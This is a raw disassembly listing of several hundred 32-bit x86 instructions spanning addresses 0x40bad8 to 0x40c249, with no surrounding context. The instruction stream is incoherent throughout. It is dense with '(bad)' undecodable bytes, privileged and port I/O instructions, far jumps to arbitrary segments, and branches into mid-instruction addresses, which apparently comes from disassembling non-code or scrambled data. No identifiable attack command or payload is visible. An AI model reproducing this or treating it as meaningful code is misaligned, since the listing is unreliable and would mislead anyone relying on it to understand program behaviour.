  40bad8:	jecxz  0x40bb49
  40bada:	sbb    eax,ecx
  40badc:	fsubr  DWORD PTR [edx-0x22824ab7]
  40bae2:	mov    al,0xd1
  40bae4:	pop    ss
  40bae5:	jmp    0x1faf:0x826a5864
  40baec:	xor    al,BYTE PTR [ecx+0x41a5c0a5]
  40baf2:	std    
  40baf3:	jo     0x40ba91
  40baf5:	mov    gs,ecx
  40baf7:	xor    bl,dh
  40baf9:	test   DWORD PTR [eax-0x37],eax
  40bafc:	mov    cl,0x9b
  40bafe:	lahf   
  40baff:	int3   
  40bb00:	lahf   
  40bb01:	cmp    BYTE PTR [ebx-0x9775efc],ah
  40bb07:	mov    al,0x36
  40bb09:	jp     0x40bb49
  40bb0b:	enter  0x84a2,0x99
  40bb0f:	xor    eax,0xbee2df0d
  40bb14:	push   edi
  40bb15:	sub    bh,ah
  40bb17:	mov    ds:0x5afef60e,eax
  40bb1c:	xlat   BYTE PTR ds:[ebx]
  40bb1d:	dec    edi
  40bb1e:	jns    0x40bb0f
  40bb20:	ds mov edi,0xea119293
  40bb26:	fbstp  TBYTE PTR [ecx-0x42efe0f9]
  40bb2c:	lods   al,BYTE PTR ds:[esi]
  40bb2d:	loope  0x40baf3
  40bb2f:	iret   
  40bb30:	jmp    0x40baeb
  40bb32:	(bad)  
  40bb33:	shr    BYTE PTR [edx+0x48],1
  40bb36:	jno    0x40bb9d
  40bb38:	jne    0x40bb19
  40bb3a:	ins    BYTE PTR es:[edi],dx
  40bb3b:	fadd   DWORD PTR [ecx]
  40bb3d:	sub    BYTE PTR [ebx-0x3633b33],0x6b
  40bb44:	adc    DWORD PTR [ecx-0x7b],esp
  40bb47:	jne    0x40bb15
  40bb49:	enter  0xdfda,0xad
  40bb4d:	pop    ds
  40bb4e:	std    
  40bb4f:	mov    ebp,0x4451b12a
  40bb54:	loopne 0x40bb16
  40bb56:	cld    
  40bb57:	adc    dh,BYTE PTR [eax-0x28e6d790]
  40bb5d:	push   ss
  40bb5e:	mov    DWORD PTR [eax-0x68],edi
  40bb61:	xchg   ebx,eax
  40bb62:	xchg   ecx,eax
  40bb63:	pushf  
  40bb64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb65:	lock sbb dl,BYTE PTR [esi-0x398d200e]
  40bb6c:	xchg   edi,eax
  40bb6d:	pop    edi
  40bb6e:	jns    0x40bb73
  40bb70:	fisttp WORD PTR [edi+0x71]
  40bb73:	enter  0xe744,0x5a
  40bb77:	fwait
  40bb78:	leave  
  40bb79:	scas   al,BYTE PTR es:[edi]
  40bb7a:	mov    ebx,0x627cf4b7
  40bb7f:	mov    ebp,0xd38e1f38
  40bb84:	int    0x96
  40bb86:	mov    cs,WORD PTR [edi-0x2b0366e7]
  40bb8c:	inc    edx
  40bb8d:	lea    esi,es:[edx-0x37c46a68]
  40bb94:	hlt    
  40bb95:	mov    dl,0xf2
  40bb97:	adc    BYTE PTR [esi],ch
  40bb99:	clc    
  40bb9a:	mov    al,0x81
  40bb9c:	(bad)  
  40bb9d:	push   0x7b
  40bb9f:	nop
  40bba0:	sub    edi,DWORD PTR [ebx+0x78464b4a]
  40bba6:	gs enter 0xac51,0x52
  40bbab:	and    al,0x9a
  40bbad:	(bad)  
  40bbae:	xor    edi,DWORD PTR [ebx+ebp*8+0x68]
  40bbb2:	repnz out 0x60,eax
  40bbb5:	jmp    0x40bbf8
  40bbb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbb8:	adc    ebx,edi
  40bbba:	and    eax,0x2b25589e
  40bbbf:	jmp    0x5645:0x9afd5601
  40bbc6:	enter  0x8183,0x20
  40bbca:	sti    
  40bbcb:	(bad)  
  40bbcc:	mov    ah,0x70
  40bbce:	dec    ecx
  40bbcf:	add    cl,BYTE PTR ds:0xeb6b596b
  40bbd5:	sub    al,0x7d
  40bbd7:	out    dx,eax
  40bbd8:	sahf   
  40bbd9:	(bad)  
  40bbda:	ds jae 0x40bc3b
  40bbdd:	loopne 0x40bbad
  40bbdf:	test   BYTE PTR [esi],0x69
  40bbe2:	jle    0x40bb6b
  40bbe4:	jmp    0xfca1af08
  40bbe9:	jnp    0x40bbe8
  40bbeb:	jmp    0x40bc01
  40bbed:	fwait
  40bbee:	mov    edi,0xfe3f0ff4
  40bbf3:	(bad)  
  40bbf4:	cmp    BYTE PTR ds:0x4cb05cd2,dl
  40bbfa:	push   ebp
  40bbfb:	ret    
  40bbfc:	jmp    0x40bbfb
  40bbfe:	jle    0x40bbb8
  40bc00:	ja     0x40bc35
  40bc02:	and    eax,0xe7df4323
  40bc07:	inc    ebp
  40bc08:	xchg   edx,eax
  40bc09:	sub    BYTE PTR [esp+ebx*1-0x30031c80],0x9b
  40bc11:	pop    ebx
  40bc12:	sbb    BYTE PTR [ecx-0x60],0x99
  40bc16:	and    al,0xc8
  40bc18:	loop   0x40bbb0
  40bc1a:	add    ch,BYTE PTR [ebp-0x6650de37]
  40bc20:	ret    
  40bc21:	cld    
  40bc22:	xchg   ecx,eax
  40bc23:	sahf   
  40bc24:	jmp    0x40bbee
  40bc26:	(bad)
  40bc29:	add    dl,al
  40bc2b:	mov    bl,0x7a
  40bc2d:	fisttp WORD PTR [edx-0x717640f0]
  40bc33:	sub    DWORD PTR [esi],ebx
  40bc35:	mov    ebx,0x4abc1e00
  40bc3a:	jge    0x40bc2d
  40bc3c:	leave  
  40bc3d:	leave  
  40bc3e:	std    
  40bc3f:	mov    ?,ecx
  40bc41:	fistp  WORD PTR [edi]
  40bc43:	xlat   BYTE PTR ds:[ebx]
  40bc44:	xor    al,0xec
  40bc46:	cwde   
  40bc47:	jmp    FWORD PTR [ebx+esi*1-0x3]
  40bc4b:	or     BYTE PTR ds:0xacc22c32,bl
  40bc51:	ins    BYTE PTR es:[edi],dx
  40bc52:	(bad)  
  40bc53:	enter  0x4056,0x35
  40bc57:	stos   BYTE PTR es:[edi],al
  40bc58:	int3   
  40bc59:	cmc    
  40bc5a:	xor    edx,DWORD PTR [ebp-0x16]
  40bc5d:	jae    0x40bc15
  40bc5f:	mov    esi,0x61775c
  40bc64:	jp     0x40bc63
  40bc66:	add    eax,ecx
  40bc68:	push   esi
  40bc69:	sub    eax,0x3ff6de4
  40bc6e:	ret    0xeb6f
  40bc71:	aam    0xad
  40bc73:	inc    esp
  40bc74:	fs mov edx,eax
  40bc77:	adc    al,cl
  40bc79:	fcomip st,st(6)
  40bc7b:	xor    BYTE PTR [ebp+0x70],ch
  40bc7e:	inc    esi
  40bc7f:	mov    ecx,0x7bf2f0bb
  40bc84:	xchg   ebp,eax
  40bc85:	in     al,0x66
  40bc87:	leave  
  40bc88:	(bad)  
  40bc89:	loop   0x40bc30
  40bc8b:	add    al,0x27
  40bc8d:	lahf   
  40bc8e:	aam    0xc7
  40bc90:	repz adc DWORD PTR [esp+eiz*8-0x62],0x7c
  40bc96:	add    eax,DWORD PTR ds:0xb8aa3ce6
  40bc9c:	pushf  
  40bc9d:	loope  0x40bcab
  40bc9f:	and    eax,ebx
  40bca1:	aad    0xb0
  40bca3:	enter  0x2d3b,0xd4
  40bca7:	sbb    eax,0x3bbc748d
  40bcac:	jmp    0x40bc4e
  40bcae:	or     eax,0xe9336575
  40bcb3:	rcr    BYTE PTR [ecx],1
  40bcb5:	fisttp WORD PTR [esp+edi*4-0x3b9d2698]
  40bcbc:	mov    bh,0xb
  40bcbe:	std    
  40bcbf:	mov    ah,0x31
  40bcc1:	lds    esp,FWORD PTR [eax-0x22]
  40bcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcc5:	dec    ebx
  40bcc6:	cmp    cl,al
  40bcc8:	nop
  40bcc9:	les    eax,FWORD PTR ds:0x5df1fe86
  40bccf:	sub    al,0xeb
  40bcd1:	push   ds
  40bcd2:	jnp    0x40bcd1
  40bcd4:	xor    edx,DWORD PTR [ecx-0x2084ed23]
  40bcda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcdb:	iret   
  40bcdc:	adc    esp,DWORD PTR [ebp+0x2b741700]
  40bce2:	(bad)  
  40bce3:	pusha  
  40bce4:	fdiv   DWORD PTR [ebx]
  40bce6:	retf   
  40bce7:	push   ds
  40bce8:	adc    al,BYTE PTR [ecx+eiz*4+0x34]
  40bcec:	das    
  40bced:	fbstp  TBYTE PTR [esi+0x44]
  40bcf0:	sti    
  40bcf1:	xchg   ecx,eax
  40bcf2:	xlat   BYTE PTR ds:[ebx]
  40bcf3:	xchg   ecx,eax
  40bcf4:	jmp    0x8fdf:0x13d644ad
  40bcfb:	jmp    DWORD PTR [eax-0xd]
  40bcfe:	cmp    eax,0x96df7231
  40bd03:	sbb    DWORD PTR [ebx],edi
  40bd05:	xor    BYTE PTR [esi-0x2e5b131],bl
  40bd0b:	xor    eax,0x44d09031
  40bd10:	mov    ds:0x5bda8d4,eax
  40bd15:	out    dx,eax
  40bd16:	mov    ecx,0xb4c84c48
  40bd1b:	addps  xmm0,XMMWORD PTR [edx-0x3]
  40bd1f:	icebp  
  40bd20:	sbb    ebp,edi
  40bd22:	stc    
  40bd23:	pop    es
  40bd24:	push   ss
  40bd25:	mov    cl,0x60
  40bd27:	enter  0xa625,0x59
  40bd2b:	dec    edx
  40bd2c:	or     dl,ch
  40bd2e:	mov    eax,ds:0xc20d00ff
  40bd33:	or     eax,0x185cd2b
  40bd38:	das    
  40bd39:	lea    ebx,[ebx]
  40bd3b:	sbb    bl,cl
  40bd3d:	(bad)  
  40bd3f:	or     al,0xdb
  40bd42:	aam    0xe8
  40bd44:	fsubr  DWORD PTR [ebx+esi*8]
  40bd47:	loopne 0x40bd36
  40bd49:	jmp    0x40bcd9
  40bd4b:	test   al,0xa5
  40bd4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd4e:	pop    eax
  40bd4f:	es adc edi,ebx
  40bd52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd53:	push   0x1d15bc65
  40bd58:	xchg   BYTE PTR [esi+0xdb7dffb],bl
  40bd5e:	jl     0x808cb84f
  40bd64:	mov    ebp,0x18258ced
  40bd69:	fbld   TBYTE PTR [eax]
  40bd6b:	xchg   esp,eax
  40bd6c:	fs (bad) 
  40bd6e:	cmc    
  40bd6f:	repz jmp 0x40bdf0
  40bd72:	aad    0x4a
  40bd74:	inc    edi
  40bd75:	mov    esp,0xc73e3a0c
  40bd7a:	mov    ds:0x181f66c8,eax
  40bd7f:	sbb    al,BYTE PTR ds:0xebbb487a
  40bd85:	into   
  40bd86:	dec    eax
  40bd87:	push   esp
  40bd88:	sahf   
  40bd89:	push   eax
  40bd8a:	sbb    al,0xf6
  40bd8c:	(bad)  
  40bd8d:	fistp  QWORD PTR [edi-0x37761339]
  40bd93:	inc    ebp
  40bd94:	imul   esp,DWORD PTR [edi-0xe055505],0xffffffba
  40bd9b:	jmp    0x972:0x8996829b
  40bda2:	fisttp DWORD PTR [edx-0x1d5e8e9d]
  40bda8:	dec    edi
  40bda9:	mov    eax,ds:0x3f6df37b
  40bdae:	(bad)
  40bdb1:	(bad)  
  40bdb2:	jns    0x40bd5a
  40bdb4:	jmp    0x40bda9
  40bdb6:	out    dx,eax
  40bdb7:	stos   BYTE PTR es:[edi],al
  40bdb8:	fcmovnu st,st(2)
  40bdba:	and    ebx,0x7d80dfa0
  40bdc0:	sahf   
  40bdc1:	xchg   ebp,eax
  40bdc2:	(bad)  
  40bdc3:	push   ss
  40bdc4:	in     eax,dx
  40bdc5:	push   ds
  40bdc6:	std    
  40bdc7:	pop    ss
  40bdc8:	add    ecx,esi
  40bdca:	jmp    0x40bdc5
  40bdcc:	test   al,0xb8
  40bdce:	inc    edi
  40bdd0:	test   eax,0x69f55488
  40bdd5:	stc    
  40bdd6:	popf   
  40bdd7:	add    al,0x17
  40bdd9:	jmp    0x40bdcd
  40bddb:	mov    edx,0x48953516
  40bde0:	and    DWORD PTR [esi+eax*2+0x70df465d],esp
  40bde7:	aas    
  40bde8:	and    eax,0x91054128
  40bded:	xchg   BYTE PTR [edx],al
  40bdef:	mov    bh,0x9f
  40bdf1:	mov    WORD PTR [ebp+0x79],?
  40bdf4:	mov    dl,0x32
  40bdf6:	mov    ch,0xd4
  40bdf8:	(bad)  
  40bdf9:	fist   WORD PTR [ecx]
  40bdfb:	jnp    0x40be2c
  40bdfd:	call   0xb7fc:0xede357f3
  40be04:	(bad)  
  40be05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be06:	pop    ss
  40be07:	mov    cl,0x75
  40be09:	jge    0x40bdc7
  40be0b:	enter  0xf2c3,0xa2
  40be0f:	lds    edx,FWORD PTR [eax-0x1455cf96]
  40be15:	fmul   QWORD PTR [edi]
  40be17:	xlat   BYTE PTR ds:[ebx]
  40be18:	push   esp
  40be19:	xor    DWORD PTR [ecx+0x44d4761b],edx
  40be1f:	imul   DWORD PTR [ecx-0x3]
  40be22:	std    
  40be23:	mov    al,0x8d
  40be25:	mov    dh,0x33
  40be27:	clc    
  40be28:	push   ds
  40be29:	add    eax,0x20c74506
  40be2e:	dec    ecx
  40be2f:	int    0xf
  40be31:	outs   dx,BYTE PTR ds:[esi]
  40be32:	lahf   
  40be33:	(bad)  
  40be34:	imul   esp,ebp,0xffffffb6
  40be37:	ror    ch,cl
  40be39:	(bad)  
  40be3a:	std    
  40be3b:	adc    ch,BYTE PTR [edi-0x4]
  40be3e:	(bad)  
  40be3f:	icebp  
  40be40:	xchg   ebx,eax
  40be41:	sub    ah,BYTE PTR [esp+ebx*8-0x1382f02f]
  40be48:	pop    edx
  40be49:	test   BYTE PTR [esi],bl
  40be4b:	mov    ecx,0x10002136
  40be50:	jb     0x40bec8
  40be52:	cwde   
  40be53:	jl     0x40bdde
  40be55:	pop    edi
  40be56:	add    BYTE PTR [esi+0x55ddfe6],0x7b
  40be5d:	test   esi,0x28e7fd47
  40be63:	mov    ebx,0x53a82feb
  40be68:	mov    al,0x6c
  40be6a:	fldenv [edi-0x17]
  40be6d:	fild   WORD PTR [edi]
  40be6f:	sbb    DWORD PTR [eax-0x2b],edx
  40be72:	push   0xfd3c3ea6
  40be77:	jl     0x40be01
  40be79:	push   0x7c
  40be7b:	xchg   edx,eax
  40be7c:	mov    ds:0x42c86890,al
  40be81:	sti    
  40be82:	ja     0x40be45
  40be84:	lds    edx,FWORD PTR [edx-0x75]
  40be87:	pop    ebx
  40be88:	jmp    0x40bee6
  40be8a:	mov    dl,0x1e
  40be8c:	imul   ebp,eax,0xdff538df
  40be92:	jbe    0x40be1b
  40be94:	mov    ebp,0xab53ab37
  40be99:	push   ebx
  40be9a:	std    
  40be9b:	rol    BYTE PTR [ecx-0x475f8482],1
  40bea1:	jp     0x40be87
  40bea3:	(bad)  
  40bea4:	adc    BYTE PTR [edx+0x6c],ch
  40bea7:	or     ah,BYTE PTR [esi-0x226ff56f]
  40bead:	mov    DWORD PTR [eax+0x6cf7eb98],esi
  40beb3:	pop    ecx
  40beb4:	loop   0x40beea
  40beb6:	out    0x94,eax
  40beb8:	in     al,0xdf
  40beba:	inc    ecx
  40bebb:	mov    ebx,0x24d7d5af
  40bec0:	lods   eax,DWORD PTR ds:[esi]
  40bec1:	pusha  
  40bec2:	bswap  ebp
  40bec4:	xchg   dl,ah
  40bec6:	cld    
  40bec7:	cwde   
  40bec8:	in     eax,dx
  40bec9:	xlat   BYTE PTR ds:[ebx]
  40beca:	xor    ah,0x84
  40becd:	ficomp WORD PTR [edx-0x5e]
  40bed0:	inc    ecx
  40bed1:	nop
  40bed2:	mov    esp,0x9e3393a3
  40bed7:	add    eax,0x86fc9c15
  40bedc:	add    BYTE PTR [eax+esi*1],dl
  40bedf:	mov    WORD PTR [ebx],cs
  40bee1:	sub    DWORD PTR [esi],edx
  40bee3:	lds    ecx,FWORD PTR [ecx+ecx*2-0x2056a91f]
  40beea:	je     0x40bed1
  40beec:	ds xchg ecx,eax
  40beee:	lods   al,BYTE PTR ds:[esi]
  40beef:	push   0xffffffea
  40bef1:	mov    ebp,0xb10fa7b3
  40bef6:	mov    esp,0x46491196
  40befb:	enter  0x94fa,0x72
  40beff:	in     al,0x15
  40bf01:	jecxz  0x40bf49
  40bf03:	sub    eax,0x98fd9ba2
  40bf08:	ins    BYTE PTR es:[edi],dx
  40bf09:	leave  
  40bf0a:	into   
  40bf0b:	mov    ah,0x3e
  40bf0d:	add    al,0xcd
  40bf0f:	arpl   WORD PTR [ebx],bp
  40bf11:	or     ebp,esp
  40bf13:	pop    eax
  40bf14:	imul   eax,DWORD PTR [eax],0xffffffc2
  40bf17:	jne    0x40bf0a
  40bf19:	inc    ecx
  40bf1a:	sub    DWORD PTR [esi],0x36c755e9
  40bf20:	xchg   esp,eax
  40bf21:	loop   0x40bf29
  40bf23:	or     bl,cl
  40bf25:	add    DWORD PTR [eax-0x35],ecx
  40bf28:	push   esp
  40bf29:	jmp    0x40bf1f
  40bf2b:	xor    DWORD PTR [edi+edi*8+0x7c],ecx
  40bf2f:	push   0xa6fcf93b
  40bf34:	add    eax,0xc7e36f2
  40bf39:	in     al,dx
  40bf3a:	inc    ecx
  40bf3b:	(bad)  
  40bf3c:	push   cs
  40bf3d:	and    al,0xa9
  40bf3f:	in     eax,0xab
  40bf41:	push   eax
  40bf42:	inc    esi
  40bf43:	sub    edx,edx
  40bf45:	imul   esi,DWORD PTR [esi-0x19ac5307],0x7567fed6
  40bf4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf50:	sub    eax,ebp
  40bf52:	rcr    BYTE PTR [ebx+0x2ed5928a],1
  40bf58:	adc    ebx,DWORD PTR ds:0xd682c85b
  40bf5e:	mov    eax,ds:0xd3142cf2
  40bf63:	(bad)  
  40bf64:	jmp    0x40bf49
  40bf66:	jo     0x40bfae
  40bf68:	out    0xc0,al
  40bf6a:	mov    ds:0x34df76e2,al
  40bf6f:	arpl   dx,bp
  40bf71:	shr    BYTE PTR [ebx+eax*8+0x8],cl
  40bf75:	data16 (bad) 
  40bf77:	rol    edi,cl
  40bf79:	(bad)  
  40bf7a:	fild   QWORD PTR [edi]
  40bf7c:	dec    edi
  40bf7d:	jmp    0xdf7d7b22
  40bf82:	push   edx
  40bf83:	add    edx,DWORD PTR [ebx+eax*2]
  40bf86:	jo     0x40bf66
  40bf88:	cld    
  40bf89:	cmp    edi,ebp
  40bf8b:	mov    al,BYTE PTR [edx+0x75cb12fd]
  40bf91:	push   edx
  40bf92:	pop    eax
  40bf93:	(bad)  
  40bf94:	dec    ebp
  40bf95:	jge    0x40bf38
  40bf97:	sub    esi,0xbbe796d
  40bf9d:	inc    esi
  40bf9e:	lahf   
  40bf9f:	hlt    
  40bfa0:	out    dx,al
  40bfa1:	xchg   edx,eax
  40bfa2:	loope  0x40bf44
  40bfa4:	push   eax
  40bfa5:	jg     0x40bfa8
  40bfa7:	xchg   esp,eax
  40bfa8:	pop    ss
  40bfa9:	inc    ebp
  40bfaa:	out    dx,eax
  40bfab:	(bad)  
  40bfac:	xchg   ebp,eax
  40bfad:	sub    eax,0xb3bc8520
  40bfb2:	jns    0x40bfc1
  40bfb4:	jmp    0x40c019
  40bfb6:	repnz xor ebp,DWORD PTR [edi+ebp*4]
  40bfba:	or     ah,ah
  40bfbc:	add    ecx,esi
  40bfbe:	ret    0x85b0
  40bfc1:	fstp   st(7)
  40bfc3:	js     0x40c042
  40bfc5:	dec    edx
  40bfc6:	ja     0x40bfe5
  40bfc8:	fs loopne 0x40bf7f
  40bfcb:	push   cs
  40bfcc:	dec    edi
  40bfcd:	mov    edi,0xe7fc0809
  40bfd2:	cs in  al,dx
  40bfd4:	jmp    0x40bfc6
  40bfd6:	inc    ecx
  40bfd7:	xchg   edx,eax
  40bfd8:	pop    edi
  40bfd9:	and    al,0x57
  40bfdb:	sub    al,0x6d
  40bfdd:	fild   WORD PTR [edx+0x3d3fc1e3]
  40bfe3:	aad    0x28
  40bfe5:	xor    ecx,edi
  40bfe7:	pop    edx
  40bfe8:	jmp    0x7b3e:0x2b045c85
  40bfef:	and    bh,BYTE PTR [ebp-0x68621b21]
  40bff5:	pop    ss
  40bff6:	aam    0xd5
  40bff8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bff9:	dec    ebx
  40bffa:	std    
  40bffb:	dec    ebx
  40bffc:	stos   DWORD PTR es:[edi],eax
  40bffd:	dec    eax
  40bffe:	in     eax,dx
  40bfff:	fld    DWORD PTR [edi+0x68]
  40c002:	sbb    dl,BYTE PTR [esp+ecx*8+0x57587901]
  40c009:	(bad)  
  40c00b:	mov    ebx,0x71f0a0b7
  40c010:	in     al,dx
  40c011:	aas    
  40c012:	psllq  mm2,QWORD PTR [ebp+0xa62dfba]
  40c019:	aas    
  40c01a:	push   edx
  40c01b:	push   ebp
  40c01c:	mov    ss,esp
  40c01e:	call   0xfcdda46d
  40c023:	fcomi  st,st(7)
  40c025:	nop
  40c026:	lea    eax,[edx-0x37d0a71f]
  40c02c:	push   ss
  40c02d:	ss xor eax,0xd9286a4
  40c033:	js     0x40c05b
  40c035:	sbb    BYTE PTR [esi-0x38],dh
  40c038:	mov    bh,0x42
  40c03a:	mov    al,ds:0x3a54ff94
  40c03f:	and    ch,bl
  40c041:	cmc    
  40c042:	xor    al,BYTE PTR [edx]
  40c044:	push   ebx
  40c045:	push   cs
  40c046:	jae    0x40c06b
  40c048:	(bad)  
  40c04b:	std    
  40c04c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c04d:	test   edx,edx
  40c04f:	jb     0x40c098
  40c051:	ds std 
  40c053:	adc    ebp,esi
  40c055:	mov    ds:0x8946089a,al
  40c05a:	aam    0xc8
  40c05c:	xor    ch,bh
  40c05e:	fwait
  40c05f:	cmp    ah,BYTE PTR [edx-0x23]
  40c062:	and    eax,0xe79ff6d8
  40c067:	(bad)  
  40c069:	fistp  WORD PTR [edx+0x75d0fa9b]
  40c06f:	or     ecx,0x6f6809df
  40c075:	pusha  
  40c076:	mov    esi,0xf648915b
  40c07b:	fld    TBYTE PTR [ecx-0x79]
  40c07e:	or     al,0x38
  40c081:	icebp  
  40c082:	jmp    0xa820b811
  40c087:	sub    DWORD PTR [edx],edi
  40c089:	mov    esp,0x96650323
  40c08e:	cld    
  40c08f:	mov    DWORD PTR [edi],edx
  40c091:	cmp    dl,BYTE PTR [edx+esi*1]
  40c094:	ss push edx
  40c096:	xchg   esp,eax
  40c097:	enter  0x9108,0xf9
  40c09b:	sbb    al,BYTE PTR [edx+eiz*4-0x5514c170]
  40c0a2:	sbb    eax,0x5ccf58f0
  40c0a7:	loop   0x40c08b
  40c0a9:	fbstp  TBYTE PTR [esi+esi*2-0x11abdf4c]
  40c0b0:	fisubr WORD PTR [ebx-0x3]
  40c0b3:	adc    cl,BYTE PTR [ebp+0x5e]
  40c0b6:	fwait
  40c0b7:	jno    0x40c0ed
  40c0b9:	inc    ebp
  40c0ba:	xor    ecx,eax
  40c0bc:	repz adc ebp,DWORD PTR [eax]
  40c0bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c0:	push   ebp
  40c0c1:	cld    
  40c0c2:	scas   eax,DWORD PTR es:[edi]
  40c0c3:	jl     0x40c0b7
  40c0c5:	in     eax,dx
  40c0c6:	mov    esp,eax
  40c0c8:	out    dx,al
  40c0c9:	pop    eax
  40c0ca:	je     0x40c074
  40c0cc:	sbb    al,0x6e
  40c0ce:	lods   al,BYTE PTR ds:[esi]
  40c0cf:	unpckhps xmm3,xmm7
  40c0d2:	in     al,0x4c
  40c0d4:	nop
  40c0d5:	jnp    0x40c11e
  40c0d7:	cmp    al,0xff
  40c0d9:	adc    eax,0xe66fd5f4
  40c0de:	fldenv [edi]
  40c0e0:	imul   esi,ecx,0xffffff8c
  40c0e3:	inc    ebp
  40c0e4:	inc    esp
  40c0e5:	fnstenv [edi+0x5a]
  40c0e8:	adc    eax,ebx
  40c0ea:	pushf  
  40c0eb:	mov    ds:0xb11b2cb5,al
  40c0f0:	jmp    0x40c093
  40c0f2:	fxtract 
  40c0f4:	xor    dl,BYTE PTR [esi]
  40c0f6:	imul   esp,edi,0xffffff95
  40c0f9:	jmp    0x9ff401da
  40c0fe:	pop    eax
  40c0ff:	outs   dx,BYTE PTR ds:[esi]
  40c100:	push   ebx
  40c101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c102:	jg     0x40c085
  40c104:	in     eax,dx
  40c105:	xchg   BYTE PTR ds:0xef3f4b77,ah
  40c10b:	call   0xcbe3606f
  40c110:	and    al,0xa9
  40c112:	stos   BYTE PTR es:[edi],al
  40c113:	jl     0x40c0e0
  40c115:	or     eax,DWORD PTR [ebp-0x351a5e6]
  40c11b:	scas   eax,DWORD PTR es:[edi]
  40c11c:	inc    edx
  40c11d:	js     0x40c105
  40c11f:	lds    ecx,FWORD PTR [esi+0x14c8cda0]
  40c125:	div    BYTE PTR [esi-0x8]
  40c128:	and    eax,0xeb07f370
  40c12d:	nop
  40c12e:	fdiv   QWORD PTR [edi]
  40c130:	cld    
  40c131:	xchg   edi,eax
  40c132:	xchg   esp,eax
  40c133:	loope  0x40c104
  40c135:	aas    
  40c136:	sbb    BYTE PTR [ebx],ch
  40c138:	aas    
  40c139:	or     DWORD PTR [ebx-0x64],esp
  40c13c:	mov    ebx,0x96db2eea
  40c141:	pop    ds
  40c142:	sbb    DWORD PTR [edx],edx
  40c144:	mov    edx,DWORD PTR [esi]
  40c146:	fwait
  40c147:	push   es
  40c148:	jmp    0x40c0ff
  40c14a:	adc    DWORD PTR [edi+0x2cf35224],eax
  40c150:	xor    bh,bl
  40c152:	jge    0x40c1a5
  40c154:	or     ch,BYTE PTR [ebx-0x80]
  40c157:	xchg   ebx,eax
  40c158:	cs in  eax,0xe4
  40c15b:	inc    edx
  40c15c:	xor    ebx,DWORD PTR [edi+eax*4+0x55]
  40c160:	into   
  40c161:	jg     0x40c176
  40c163:	or     al,bl
  40c165:	sar    DWORD PTR ds:0x9f9076ce,cl
  40c16b:	out    dx,al
  40c16c:	jle    0x40c1cd
  40c16e:	test   BYTE PTR [eax+0x1df667ec],bh
  40c174:	in     eax,dx
  40c175:	jge    0x40c110
  40c177:	xchg   DWORD PTR [edi+edi*4],ebx
  40c17a:	or     edi,DWORD PTR [bx+si]
  40c17d:	push   edx
  40c17e:	cwde   
  40c17f:	enter  0xc965,0x2f
  40c183:	lods   eax,DWORD PTR ds:[esi]
  40c184:	test   BYTE PTR [ebx-0x4b],bh
  40c187:	sub    ebx,DWORD PTR [edi]
  40c189:	frndint 
  40c18b:	adc    bh,BYTE PTR [esi+0x2c]
  40c18e:	inc    ebp
  40c18f:	jb     0x40c120
  40c191:	mov    eax,0x9742c8ca
  40c196:	and    dh,BYTE PTR [edx]
  40c198:	mov    DWORD PTR [esi],eax
  40c19a:	fwait
  40c19b:	adc    ah,dh
  40c19d:	dec    esi
  40c19e:	faddp  st(5),st
  40c1a0:	or     eax,0x3fcf515f
  40c1a5:	jmp    0x40c1dd
  40c1a7:	enter  0xc8ca,0xc
  40c1ab:	sti    
  40c1ac:	mov    ah,0xf
  40c1ae:	mov    ecx,0xe67cebfd
  40c1b3:	cmp    al,0x4b
  40c1b5:	pop    esp
  40c1b6:	jbe    0x40c155
  40c1b8:	(bad)  
  40c1ba:	out    0xac,al
  40c1bc:	jecxz  0x40c1b7
  40c1be:	dec    ebp
  40c1bf:	or     BYTE PTR [ebp+0x1b],ah
  40c1c2:	int3   
  40c1c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c5:	inc    esi
  40c1c6:	std    
  40c1c7:	in     al,0x23
  40c1c9:	ror    DWORD PTR [eax+0x4ae603e3],0xc9
  40c1d0:	sbb    eax,0x35e20e00
  40c1d5:	xor    al,0xde
  40c1d7:	out    0xf5,eax
  40c1d9:	lds    ebp,FWORD PTR [esi+eiz*8]
  40c1dc:	hlt    
  40c1dd:	dec    eax
  40c1de:	cmp    bl,BYTE PTR [ecx-0x1982138]
  40c1e4:	test   eax,0x60971ca8
  40c1e9:	(bad)  
  40c1eb:	mov    bh,0xb6
  40c1ed:	out    dx,al
  40c1ee:	lock mov cl,0xad
  40c1f1:	fiadd  DWORD PTR [ebx]
  40c1f3:	jno    0x40c26c
  40c1f5:	idiv   ah
  40c1f7:	ficomp DWORD PTR [edi-0x3f97bf7a]
  40c1fd:	fsub   QWORD PTR ds:0x3d631b42
  40c203:	adc    DWORD PTR [edx],0xcb18bc06
  40c209:	xchg   esi,eax
  40c20a:	in     eax,dx
  40c20b:	pop    esi
  40c20c:	pop    ss
  40c20d:	sub    bh,ch
  40c20f:	fwait
  40c210:	aaa    
  40c211:	sbb    al,0x98
  40c213:	and    BYTE PTR [edx],ah
  40c215:	(bad)  
  40c216:	int3   
  40c217:	enter  0x9a1e,0xda
  40c21b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c21c:	adc    al,0xbe
  40c21e:	int3   
  40c21f:	sbb    ch,bl
  40c221:	sub    al,0x48
  40c223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c224:	loop   0x40c247
  40c226:	cld    
  40c227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c228:	fbld   TBYTE PTR es:[esp+eax*4-0x4e52d991]
  40c230:	cdq    
  40c231:	popa   
  40c232:	std    
  40c233:	xor    eax,0x72b953df
  40c238:	and    BYTE PTR [esi+0x72],dh
  40c23b:	or     bl,bl
  40c23d:	xor    dh,BYTE PTR [ecx-0xb96345b]
  40c243:	mov    ds:0x6e3001ee,eax
  40c248:	ret    
  40c249:	aas    
